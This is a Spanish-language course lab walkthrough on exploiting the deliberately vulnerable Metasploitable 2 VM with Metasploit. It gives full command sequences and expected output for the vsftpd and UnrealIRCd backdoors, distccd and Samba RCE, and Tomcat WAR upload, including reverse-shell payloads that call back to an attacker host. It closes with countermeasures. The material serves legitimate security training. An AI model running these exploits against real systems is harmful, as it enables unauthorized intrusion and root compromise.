---
title: "🔍 Práctica: Metodología de Explotación y Manejo de Handlers con Metasploit"
aliases:
  - Metodología de Explotación y Manejo de Handlers con Metasploit
  - PoC metasploit
tags:
  - ifct0109/pocs
  - auditoria
  - metasploit
  - meterpreter
  - exploits
---

# 🔍 Práctica: Metodología de Explotación y Manejo de Handlers con Metasploit

> [!abstract] Resumen del Laboratorio
> Arsenal técnico de auditoría y pentesting del Certificado IFCT0109: reconocimiento de infraestructura, captura y análisis de hashes, explotación, pivoting perimetral e investigación de desbordamientos de memoria en entornos controlados.

---

# 🎯 Explotación de Metasploitable 2 con Metasploit Framework

## 📖 ENUNCIADO (DESCRIPCIÓN)

En esta práctica aprenderemos a explotar vulnerabilidades conocidas en **Metasploitable 2**, una máquina virtual intencionadamente vulnerable creada con fines educativos. Utilizaremos **Metasploit Framework**, la herramienta de pentesting más popular del mundo, para identificar y explotar múltiples servicios vulnerables.

> [!warning] ⚠️ ADVERTENCIA LEGAL
>        Esta práctica SOLO debe realizarse en entornos controlados de laboratorio con fines educativos. Explotar vulnerabilidades en sistemas sin autorización explícita es ILEGAL y puede conllevar consecuencias penales graves.
>         Solo en tu laboratorio. Solo con tus máquinas virtuales.

## 📚 CONCEPTOS PREVIOS

### 🔧 ¿Qué es Metasploit Framework?

**Metasploit Framework** es una plataforma de código abierto para el desarrollo, prueba y ejecución de exploits. Es la herramienta más utilizada por profesionales de seguridad para:

* ✅ Realizar pruebas de penetración autorizadas

* ✅ Validar parches de seguridad

* ✅ Investigar vulnerabilidades

* ✅ Desarrollar y probar exploits

* ✅ Ejecutar campañas de Red Team

### 🎯 ¿Qué es Metasploitable 2?

**Metasploitable 2** es una máquina virtual Linux basada en Ubuntu que contiene múltiples vulnerabilidades conocidas de forma intencionada. Fue creada por Rapid7 (desarrolladores de Metasploit) específicamente para practicar técnicas de pentesting en un entorno legal y seguro.

#### 📦 Características de Metasploitable 2

* Sistema operativo: Ubuntu Linux 8.04

* Más de 30 servicios vulnerables

* Múltiples aplicaciones web vulnerables

* Configuraciones inseguras intencionales

* Credenciales por defecto débiles

### 📋 Componentes de Metasploit

| Componente | Descripción | Ejemplo |
| --- | --- | --- |
| Exploits | Código que aprovecha una vulnerabilidad | `exploit/unix/ftp/vsftpd_234_backdoor` |
| Payloads | Código que se ejecuta tras explotar | `cmd/unix/reverse` |
| Auxiliary | Módulos de escaneo y enumeración | `scanner/http/tomcat_mgr_login` |
| Encoders | Ofuscan payloads para evadir detección | `x86/shikata_ga_nai` |
| Post | Módulos post-explotación | `post/linux/gather/enum_system` |

## 🖥️ Configuración del Entorno

### 📋 Requisitos

* 🐉 Kali Linux (atacante) - IP: 10.0.0.4

* 🎯 Metasploitable 2 (víctima) - IP: 10.0.0.5

* 🌐 Ambas máquinas en la misma red

> [!warning] 📝 Configuración de Red:
>
>           RHOST  (Remote Host) → 10.0.0.5 (Metasploitable 2 - víctima)
>           LHOST  (Local Host) → 10.0.0.4 (Kali Linux - atacante)
>
>        Ajusta estas IPs según tu entorno de laboratorio.

## 🔍 Reconocimiento Inicial

Antes de explotar, necesitamos identificar los servicios vulnerables disponibles en Metasploitable 2.

### 🎯 Escaneo con Nmap

```bash
sudo nmap -sV -O 10.0.0.5 -p-
```

#### 📋 Explicación de parámetros:

* `-sV` → Detectar versiones de servicios

* `-O` → Detectar sistema operativo

* `-p-` → Escanear TODOS los puertos (1-65535)

### 📊 Resultados del Escaneo

```bash
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.3.4
22/tcp    open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp    open  telnet      Linux telnetd
25/tcp    open  smtp        Postfix smtpd
53/tcp    open  domain      ISC BIND 9.4.2
80/tcp    open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp   open  exec        netkit-rsh rexecd
513/tcp   open  login       OpenBSD or Solaris rlogind
514/tcp   open  tcpwrapped
1099/tcp  open  java-rmi    GNU Classpath grmiregistry
1524/tcp  open  bindshell   Metasploitable root shell
2049/tcp  open  nfs         2-4 (RPC #100003)
2121/tcp  open  ftp         ProFTPD 1.3.1
3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
3632/tcp  open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp  open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp  open  vnc         VNC (protocol 3.3)
6000/tcp  open  X11         (access denied)
6667/tcp  open  irc         UnrealIRCd
6697/tcp  open  irc         UnrealIRCd
8009/tcp  open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
8787/tcp  open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
```

**Información del sistema:**

```bash
Running: Linux 2.6.X
OS details: Linux 2.6.9 - 2.6.33
```

> 🎯 Observación:  Este sistema tiene más de 30 puertos abiertos con servicios vulnerables. En un entorno de producción real, esto sería extremadamente peligroso. Vamos a explotar algunos de los más comunes.

## 🚀 Prueba de Concepto (PoC)

## 🔓 Ejercicio 1: Explotación de vsftpd 2.3.4 (Backdoor)

Comenzaremos con una de las vulnerabilidades más famosas: el backdoor en **vsftpd 2.3.4**.

### 🎯 Sobre la vulnerabilidad

#### 💡 CVE-2011-2523

En julio de 2011 se descubrió que la versión 2.3.4 de vsftpd (servicio FTP) contenía una **puerta trasera** (backdoor) insertada de forma maliciosa en el código fuente.

**¿Cómo funciona?** Si un usuario envía un nombre de usuario que termina en `:)`, el servidor abre un shell en el puerto 6200 con privilegios de root.

### 🔎 Paso 1: Buscar exploits disponibles

```bash
searchsploit vsftpd
```

**Resultados:**

```bash
vsftpd 2.3.4 - Backdoor Command Execution                    | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)       | unix/remote/17491.rb
```

### 🔧 Opción A: Exploit Python Manual

Podemos usar el exploit Python standalone:

```bash
searchsploit -m 49757
python3 49757.py 10.0.0.5
```

Esto debería darte acceso directo al sistema.

### 🔧 Opción B: Usando Metasploit Framework

#### 🚀 Paso 1: Iniciar Metasploit

```bash
msfconsole
```

Espera a que cargue la consola de Metasploit.

#### 🔍 Paso 2: Buscar el exploit

```bash
msf6 > search vsftpd
```

Verás el módulo disponible:

```bash
exploit/unix/ftp/vsftpd_234_backdoor
```

#### 📦 Paso 3: Cargar el exploit

```bash
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
```

O puedes usar el índice:

```bash
msf6 > use 0
```

#### ⚙️ Paso 4: Configurar el objetivo

```bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.0.0.5
```

Verifica las opciones:

```bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
```

#### 🚀 Paso 5: Ejecutar el exploit

```bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
```

O alternativamente:

```bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
```

### ✅ Resultado Esperado

```bash
[*] 10.0.0.5:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.0.0.5:21 - USER: 331 Please specify the password.
[+] 10.0.0.5:21 - Backdoor service has been spawned, handling...
[+] 10.0.0.5:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened
```

¡Tienes acceso como **root**! Prueba comandos:

```bash
whoami
id
uname -a
pwd
```

> [!warning] 🎯 Estado actual:  Tienes una shell como usuario root con privilegios totales en el sistema.

## 🎭 Ejercicio 2: Explotación de UnrealIRCd (Backdoor)

Ahora vamos a explotar el servidor IRC que corre en los puertos 6667 y 6697.

### 🎯 Sobre la vulnerabilidad

#### 💡 UnrealIRCd Backdoor

Entre noviembre de 2009 y junio de 2010, el código fuente de UnrealIRCd fue comprometido y contenía una backdoor que permitía ejecución remota de comandos.

**¿Cómo funciona?** Un atacante puede enviar comandos del sistema precedidos por "AB;" al servidor IRC para que sean ejecutados.

### 🔍 Paso 1: Buscar el exploit en Metasploit

```bash
msf6 > search unreal
```

### 📦 Paso 2: Cargar el exploit

```bash
msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
```

### 🎯 Paso 3: Ver payloads disponibles

```bash
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > show payloads
```

Verás múltiples opciones de payload. Vamos a usar una reverse shell:

```bash
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload cmd/unix/reverse
```

### ⚙️ Paso 4: Configurar opciones

```bash
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 10.0.0.5
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 10.0.0.4
```

Verifica la configuración:

```bash
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > show options
```

### 🚀 Paso 5: Ejecutar el exploit

```bash
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > run
```

### ✅ Resultado Esperado

```bash
[*] Started reverse TCP double handler on 10.0.0.4:4444
[*] 10.0.0.5:6667 - Connected to 10.0.0.5:6667...
[*] 10.0.0.5:6667 - Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command shell session 2 opened (10.0.0.4:4444 -> 10.0.0.5:xxxxx)
```

Ahora tienes acceso al sistema. Prueba:

```bash
whoami
pwd
ls -la
```

## ⚡ Ejercicio 3: Explotación de Distccd

Distccd es un servidor de compilación distribuida que tiene una vulnerabilidad de ejecución remota de comandos.

### 🎯 Sobre la vulnerabilidad

#### 💡 CVE-2004-2687

Distcc versiones 2.x contienen una vulnerabilidad que permite a atacantes remotos ejecutar comandos arbitrarios mediante el envío de comandos shell en lugar de rutas de compilador.

**Limitación:** Este exploit generalmente proporciona acceso con privilegios bajos (usuario daemon).

### 🔍 Paso 1: Buscar el exploit

```bash
msf6 > search distccd
```

### 📦 Paso 2: Cargar el exploit

```bash
msf6 > use exploit/unix/misc/distcc_exec
```

### 🎯 Paso 3: Seleccionar payload

```bash
msf6 exploit(unix/misc/distcc_exec) > show payloads
```

Configurar reverse shell:

```bash
msf6 exploit(unix/misc/distcc_exec) > set payload cmd/unix/reverse
```

### ⚙️ Paso 4: Configurar objetivo

```bash
msf6 exploit(unix/misc/distcc_exec) > set RHOSTS 10.0.0.5
msf6 exploit(unix/misc/distcc_exec) > set LHOST 10.0.0.4
```

Verificar opciones:

```bash
msf6 exploit(unix/misc/distcc_exec) > show options
```

### 🚀 Paso 5: Ejecutar

```bash
msf6 exploit(unix/misc/distcc_exec) > run
```

### ✅ Resultado Esperado

```bash
[*] Started reverse TCP double handler on 10.0.0.4:4444
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command shell session 3 opened
```

Verifica el usuario:

```bash
whoami
```

Probablemente verás:

```bash
daemon
```

> [!warning] ⚠️ Nota:  Este exploit proporciona acceso con privilegios bajos (usuario daemon). Para obtener root necesitarías realizar escalada de privilegios.

## 🔐 Ejercicio 4: Explotación de Samba (usermap_script)

Samba es una implementación de protocolo SMB/CIFS para compartir archivos en redes. La versión en Metasploitable tiene una vulnerabilidad crítica.

### 🎯 Sobre la vulnerabilidad

#### 💡 CVE-2007-2447

Samba versiones 3.0.20 a 3.0.25rc3 contienen una vulnerabilidad en la opción "username map script" que permite ejecución remota de comandos mediante metacaracteres shell.

**Impacto:** Acceso root inmediato al sistema.

### 🔍 Paso 1: Buscar el exploit

```bash
msf6 > search usermap_script
```

### 📦 Paso 2: Cargar el exploit

```bash
msf6 > use exploit/multi/samba/usermap_script
```

O usando el índice:

```bash
msf6 > use 0
```

### ⚙️ Paso 3: Configurar el objetivo

```bash
msf6 exploit(multi/samba/usermap_script) > set RHOSTS 10.0.0.5
msf6 exploit(multi/samba/usermap_script) > set LHOST 10.0.0.4
```

### 🚀 Paso 4: Ejecutar

```bash
msf6 exploit(multi/samba/usermap_script) > run
```

### ✅ Resultado Esperado

```bash
[*] Started reverse TCP handler on 10.0.0.4:4444
[*] Command shell session 4 opened (10.0.0.4:4444 -> 10.0.0.5:xxxxx)
```

Verifica privilegios:

```bash
id
whoami
```

Deberías ver:

```bash
uid=0(root) gid=0(root)
```

> 🎯 ¡Éxito!  Tienes acceso root completo al sistema a través de la vulnerabilidad de Samba.

## 🌐 Ejercicio 5: Explotación de Apache Tomcat

Apache Tomcat es un servidor web Java. En este caso, vamos a realizar un ataque en dos fases: primero encontrar las credenciales y luego subir un payload malicioso.

### 🎯 Sobre la vulnerabilidad

#### 💡 Credenciales por defecto + Subida de WAR

Muchas instalaciones de Tomcat usan credenciales por defecto. Una vez autenticados, podemos usar el Manager para subir un archivo WAR malicioso que nos dará acceso al sistema.

### 📍 Fase 1: Descubrimiento de Credenciales

#### 🔍 Paso 1: Buscar el módulo de login

```bash
msf6 > search tomcat login
```

#### 📦 Paso 2: Usar el módulo auxiliar

```bash
msf6 > use auxiliary/scanner/http/tomcat_mgr_login
```

#### ⚙️ Paso 3: Configurar objetivo

```bash
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS 10.0.0.5
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180
```

> [!warning] 📝 Nota:  Tomcat en Metasploitable corre en el puerto 8180, no en el puerto estándar 8080.

#### 🚀 Paso 4: Ejecutar el escaneo

```bash
msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
```

#### ✅ Resultado - Credenciales encontradas

```bash
[+] 10.0.0.5:8180 - Login Successful: tomcat:tomcat
```

¡Hemos encontrado las credenciales: `tomcat:tomcat`!

### 🚀 Fase 2: Explotación mediante Upload de WAR

#### 🔍 Paso 1: Buscar exploit de upload

```bash
msf6 > search tomcat mgr
```

#### 📦 Paso 2: Cargar el exploit

```bash
msf6 > use exploit/multi/http/tomcat_mgr_upload
```

#### ⚙️ Paso 3: Configurar todas las opciones

```bash
msf6 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 10.0.0.5
msf6 exploit(multi/http/tomcat_mgr_upload) > set RPORT 8180
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername tomcat
msf6 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword tomcat
```

Verificar configuración:

```bash
msf6 exploit(multi/http/tomcat_mgr_upload) > show options
```

#### 🚀 Paso 4: Ejecutar el exploit

```bash
msf6 exploit(multi/http/tomcat_mgr_upload) > run
```

### ✅ Resultado Esperado

```bash
[*] Started reverse TCP handler on 10.0.0.4:4444
[*] Uploading WAR file...
[*] Executing WAR file...
[*] Sending stage (58851 bytes) to 10.0.0.5
[*] Meterpreter session 5 opened (10.0.0.4:4444 -> 10.0.0.5:xxxxx)
```

¡Ahora tienes una sesión **Meterpreter**!

```bash
meterpreter >
```

#### 🎮 Comandos útiles de Meterpreter

```bash
meterpreter > sysinfo
```

Verás información del sistema:

```bash
Computer    : metasploitable
OS          : Linux 2.6.24-16-server (i386)
Meterpreter : java/linux
```

Otros comandos útiles:

```bash
meterpreter > getuid
meterpreter > pwd
meterpreter > ls
meterpreter > shell
```

> 🎯 ¡Éxito!  Has comprometido el servidor Tomcat mediante credenciales débiles y upload de payload malicioso.

## 📊 Resumen de Vulnerabilidades Explotadas

| Servicio | Puerto | Vulnerabilidad | Privilegios obtenidos | Dificultad |
| --- | --- | --- | --- | --- |
| vsftpd 2.3.4 | 21 | Backdoor en código fuente | ✅ root | 🟢 Fácil |
| UnrealIRCd | 6667 | Backdoor en código fuente | ✅ root | 🟢 Fácil |
| Distccd | 3632 | Ejecución remota de comandos | ⚠️ daemon (bajos privilegios) | 🟡 Media |
| Samba | 139/445 | usermap_script RCE | ✅ root | 🟢 Fácil |
| Tomcat | 8180 | Credenciales débiles + WAR upload | ⚠️ tomcat55 (bajos privilegios) | 🟡 Media |

## 🛡️ Medidas de Protección

### 🔒 ¿Cómo protegerse de estas vulnerabilidades?

| Medida | Descripción | Efectividad |
| --- | --- | --- |
| Actualizar software | Mantener todos los servicios actualizados con parches de seguridad | ✅ Muy Alta |
| Cambiar credenciales por defecto | Nunca usar usuario/contraseña por defecto | ✅ Alta |
| Principio de mínimo privilegio | Servicios deben correr con los mínimos privilegios necesarios | ✅ Alta |
| Firewall y segmentación | Limitar acceso a servicios solo a redes autorizadas | ✅ Alta |
| IDS/IPS | Detectar y bloquear intentos de explotación | ✅ Media-Alta |
| Auditorías regulares | Escaneos de vulnerabilidades periódicos | ✅ Alta |
| Deshabilitar servicios innecesarios | Si no se usa, apagarlo | ✅ Muy Alta |

### ✅ Recomendaciones específicas

* ✅ vsftpd: Actualizar a versión 3.x o usar ProFTPD/Pure-FTPd

* ✅ UnrealIRCd: Actualizar a versión 3.2.10.5 o superior

* ✅ Distccd: Configurar ACLs restrictivas o deshabilitarlo

* ✅ Samba: Actualizar a versión 3.0.26 o superior

* ✅ Tomcat: Cambiar credenciales, restringir acceso al Manager, actualizar

* ✅ General: Implementar autenticación de dos factores cuando sea posible

* ✅ Monitorización: Implementar logging centralizado y alertas

## 📚 Comandos de Referencia Rápida

| Fase | Comando | Descripción |
| --- | --- | --- |
| Reconocimiento | `nmap -sV -O IP -p-` | Escaneo completo de puertos y servicios |
| Buscar exploits | `searchsploit servicio` | Buscar exploits disponibles |
| Metasploit | `msfconsole` | Iniciar Metasploit Framework |
| Buscar módulos | `search nombre` | Buscar módulos en Metasploit |
| Cargar exploit | `use exploit/ruta/modulo` | Cargar un módulo específico |
| Ver opciones | `show options` | Mostrar opciones configurables |
| Configurar | `set OPCION valor` | Configurar parámetros |
| Ejecutar | `run` o `exploit` | Lanzar el exploit |
| Ver payloads | `show payloads` | Ver payloads compatibles |
| Sesiones activas | `sessions -l` | Listar sesiones abiertas |
| Interactuar | `sessions -i NUMERO` | Interactuar con una sesión |

## 📚 Conclusiones

### 🎓 Lo que hemos aprendido:

* ✅ Uso de Nmap para reconocimiento de servicios vulnerables

* ✅ Búsqueda y selección de exploits apropiados

* ✅ Configuración y uso de Metasploit Framework

* ✅ Explotación de múltiples vulnerabilidades conocidas

* ✅ Diferencia entre acceso con privilegios bajos y root

* ✅ Uso de sesiones Meterpreter para post-explotación

* ✅ Importancia de mantener sistemas actualizados

### ⚠️ Responsabilidad Ética:

Este conocimiento debe usarse ÚNICAMENTE para:

* 🎓 Educación y formación en ciberseguridad

* 🔐 Pentesting autorizado y legal con contrato firmado

* 🛡️ Mejorar la seguridad de tus propios sistemas

* 📖 Investigación en entornos controlados

**NUNCA para actividades ilegales. Acceder sin autorización a sistemas informáticos es un delito grave que puede resultar en penas de prisión.**

---

## 🔗 Enlaces y Referencias
* 🗂️ [[02 - MODULOS/05 - Prácticas (PoCs)|Catálogo General de Prácticas (PoCs)]]
* 🧪 [[02 - MODULOS/04 - Hacking Ético|Módulo Central de Hacking Ético]]
